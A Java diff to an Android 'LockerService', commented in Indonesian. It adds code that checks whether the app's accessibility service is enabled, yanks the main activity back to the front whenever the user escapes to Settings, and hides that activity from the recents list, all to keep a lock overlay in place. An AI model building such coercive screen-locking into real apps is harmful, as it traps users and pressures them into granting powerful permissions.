@@ -10,6 +10,8 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.graphics.PixelFormat;
 import android.hardware.camera2.CameraManager;
+import android.view.accessibility.AccessibilityManager;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.os.IBinder;
 import android.os.Build;
 import android.os.PowerManager;
@@ -76,13 +78,29 @@ public class LockerService extends Service {
         }
     }
 
+    private boolean isAccessibilityServiceEnabled() {
+        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
+        java.util.List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
+        for (AccessibilityServiceInfo enabledService : enabledServices) {
+            if (enabledService.getResolveInfo().serviceInfo.packageName.equals(getPackageName())) {
+                return true;
+            }
+        }
+        return false;
+    }
+
     // Memaksa MainActivity kembali ke depan jika user berhasil lari ke Settings
     public void forceFront() {
+        if (isAuthenticated) return;
+
+        // Jika aksesibilitas mati, panggil MainActivity agar user dipaksa ke Settings.
+        // Namun jika sedang AKTIF, kita tarik MainActivity hanya untuk menjaga overlay tetap kuat.
         Intent i = new Intent(this, MainActivity.class);
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
                    Intent.FLAG_ACTIVITY_SINGLE_TOP |
-                   Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                   Intent.FLAG_ACTIVITY_NO_ANIMATION |
+                   Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
         startActivity(i);
     }
 
